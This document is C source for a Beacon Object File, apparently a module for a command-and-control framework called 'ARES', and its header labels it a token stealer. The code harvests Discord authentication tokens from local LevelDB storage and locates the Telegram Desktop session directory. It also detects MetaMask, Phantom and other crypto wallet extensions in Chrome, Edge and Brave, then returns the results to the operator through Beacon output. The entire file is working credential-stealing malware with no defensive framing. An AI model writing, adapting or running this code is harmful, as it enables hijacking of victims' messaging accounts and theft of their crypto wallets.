/*
 * ═══════════════════════════════════════════════════════════════
 *  ARES BOF — Token Stealer (Discord + Telegram + Crypto Wallets)
 *
 *  Compile: gcc -c -w -O2 -o steal_tokens.o steal_tokens_bof.c
 *  Entry:   void go(char* args, int args_len)
 * ═══════════════════════════════════════════════════════════════
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <string.h>

extern void BeaconPrintf(int type, const char* fmt, ...);
extern void BeaconOutput(int type, const char* data, int len);

/* ── File helpers ── */
static char* read_file_text(const char* path, DWORD* sz) {
    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
                          NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return NULL;
    *sz = GetFileSize(h, NULL);
    if (*sz == 0 || *sz > 10*1024*1024) { CloseHandle(h); return NULL; }
    char* buf = (char*)HeapAlloc(GetProcessHeap(), 0, *sz + 1);
    if (!buf) { CloseHandle(h); return NULL; }
    DWORD r; ReadFile(h, buf, *sz, &r, NULL);
    CloseHandle(h); buf[r] = '\0'; *sz = r;
    return buf;
}

/* ── Discord token regex-like scanner ── */
/* Discord tokens: ~70 chars, base64-like, contain dots */
static int scan_for_discord_tokens(const char* data, int len, 
    char tokens[][128], int max_tokens)
{
    int count = 0;
    for (int i = 0; i < len - 50 && count < max_tokens; i++) {
        /* Look for token patterns: starts with M/N/O followed by alphanumeric */
        if ((data[i] == 'M' || data[i] == 'N' || data[i] == 'O') &&
            data[i+1] >= 'A' && data[i+24] == '.') {
            /* Extract candidate token (up to ~70 chars, stop at non-token char) */
            int j = 0;
            while (i + j < len && j < 127) {
                char c = data[i + j];
                if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || 
                    (c >= '0' && c <= '9') || c == '.' || c == '-' || c == '_') {
                    tokens[count][j] = c;
                    j++;
                } else break;
            }
            if (j > 50 && j < 100) { /* Valid token length */
                tokens[count][j] = '\0';
                count++;
            }
            i += j;
        }
    }
    return count;
}

/* ── Discord paths ── */
typedef struct { const char* name; const char* rel_path; } AppPath;
static AppPath discord_apps[] = {
    {"Discord",       "discord\\Local Storage\\leveldb"},
    {"DiscordCanary", "discordcanary\\Local Storage\\leveldb"},
    {"DiscordPTB",    "discordptb\\Local Storage\\leveldb"},
    {"Opera",         "Opera Software\\Opera Stable\\Local Storage\\leveldb"},
    {NULL, NULL}
};

static int steal_discord_tokens(const char* appdata, char* json, int json_max) {
    int off = 0;
    int total = 0;
    off += snprintf(json + off, json_max - off, "[");
    
    for (int a = 0; discord_apps[a].name; a++) {
        char dir[MAX_PATH];
        snprintf(dir, MAX_PATH, "%s\\%s", appdata, discord_apps[a].rel_path);
        
        if (GetFileAttributesA(dir) == INVALID_FILE_ATTRIBUTES) continue;
        
        /* Scan .ldb and .log files in leveldb dir */
        char search[MAX_PATH];
        snprintf(search, MAX_PATH, "%s\\*", dir);
        WIN32_FIND_DATAA fd;
        HANDLE hf = FindFirstFileA(search, &fd);
        if (hf == INVALID_HANDLE_VALUE) continue;
        
        do {
            const char* ext = strrchr(fd.cFileName, '.');
            if (!ext) continue;
            if (_stricmp(ext, ".ldb") != 0 && _stricmp(ext, ".log") != 0) continue;
            
            char filepath[MAX_PATH];
            snprintf(filepath, MAX_PATH, "%s\\%s", dir, fd.cFileName);
            DWORD sz;
            char* data = read_file_text(filepath, &sz);
            if (!data) continue;
            
            char tokens[16][128];
            int found = scan_for_discord_tokens(data, (int)sz, tokens, 16);
            for (int t = 0; t < found; t++) {
                if (total > 0) off += snprintf(json + off, json_max - off, ",");
                off += snprintf(json + off, json_max - off,
                    "{\"app\":\"%s\",\"token\":\"%s\"}", discord_apps[a].name, tokens[t]);
                total++;
            }
            HeapFree(GetProcessHeap(), 0, data);
        } while (FindNextFileA(hf, &fd));
        FindClose(hf);
    }
    
    off += snprintf(json + off, json_max - off, "]");
    return total;
}

/* ── Telegram session steal ── */
static BOOL steal_telegram_session(const char* appdata, char* out_path, int max) {
    /* Telegram stores session in tdata directory */
    snprintf(out_path, max, "%s\\Telegram Desktop\\tdata", appdata);
    return (GetFileAttributesA(out_path) != INVALID_FILE_ATTRIBUTES);
}

/* ── Crypto wallet extension IDs ── */
typedef struct { const char* name; const char* ext_id; } WalletExt;
static WalletExt wallet_exts[] = {
    {"MetaMask",        "nkbihfbeogaeaoehlefnkodbefgpgknn"},
    {"Phantom",         "bfnaelmomeimhlpmgjnjophhpkkoljpa"},
    {"Coinbase",        "hnfanknocfeofbddgcijnmhnfnkdnaad"},
    {"TronLink",        "ibnejdfjmmkpcnlpebklmnkoeoihofec"},
    {"Ronin",           "fnjhmkhhmkbjkkabndcnnogagogbneec"},
    {"Brave Wallet",    "odbfpeeihdkbihmopkbjmoonfanlbfcl"},
    {NULL, NULL}
};

static int check_crypto_wallets(const char* localappdata, char* json, int json_max) {
    int off = 0, count = 0;
    off += snprintf(json + off, json_max - off, "[");
    
    const char* browsers[] = {
        "Google\\Chrome\\User Data\\Default\\Extensions",
        "Microsoft\\Edge\\User Data\\Default\\Extensions",
        "BraveSoftware\\Brave-Browser\\User Data\\Default\\Extensions",
        NULL
    };
    
    for (int b = 0; browsers[b]; b++) {
        for (int w = 0; wallet_exts[w].name; w++) {
            char ext_path[MAX_PATH];
            snprintf(ext_path, MAX_PATH, "%s\\%s\\%s", 
                    localappdata, browsers[b], wallet_exts[w].ext_id);
            if (GetFileAttributesA(ext_path) != INVALID_FILE_ATTRIBUTES) {
                if (count > 0) off += snprintf(json + off, json_max - off, ",");
                off += snprintf(json + off, json_max - off,
                    "{\"wallet\":\"%s\",\"browser\":\"%s\",\"path\":\"%s\"}",
                    wallet_exts[w].name, 
                    b == 0 ? "Chrome" : (b == 1 ? "Edge" : "Brave"),
                    ext_path);
                count++;
            }
        }
    }
    
    off += snprintf(json + off, json_max - off, "]");
    return count;
}

/* ═══════════════════════════════════════════════════════
 *  BOF ENTRY POINT
 * ═══════════════════════════════════════════════════════ */
void go(char* args, int args_len)
{
    (void)args; (void)args_len;
    
    char appdata[MAX_PATH], localappdata[MAX_PATH];
    GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH);
    GetEnvironmentVariableA("LOCALAPPDATA", localappdata, MAX_PATH);
    
    char json[32768];
    int off = 0;
    off += snprintf(json + off, sizeof(json) - off, "{\"type\":\"tokens\",");
    
    /* 1. Discord tokens */
    char discord_json[8192];
    int discord_count = steal_discord_tokens(appdata, discord_json, sizeof(discord_json));
    off += snprintf(json + off, sizeof(json) - off, 
                    "\"discord\":{\"count\":%d,\"tokens\":%s},", discord_count, discord_json);
    
    /* 2. Telegram check */
    char tg_path[MAX_PATH];
    BOOL tg_found = steal_telegram_session(appdata, tg_path, MAX_PATH);
    off += snprintf(json + off, sizeof(json) - off,
                    "\"telegram\":{\"found\":%s,\"path\":\"%s\"},",
                    tg_found ? "true" : "false", tg_found ? tg_path : "");
    
    /* 3. Crypto wallets */
    char wallet_json[8192];
    int wallet_count = check_crypto_wallets(localappdata, wallet_json, sizeof(wallet_json));
    off += snprintf(json + off, sizeof(json) - off,
                    "\"wallets\":{\"count\":%d,\"found\":%s}", wallet_count, wallet_json);
    
    off += snprintf(json + off, sizeof(json) - off, "}");
    
    BeaconOutput(0, json, off);
    BeaconPrintf(0, "\n[+] Tokens: Discord=%d, Telegram=%s, Wallets=%d",
                 discord_count, tg_found ? "YES" : "NO", wallet_count);
}
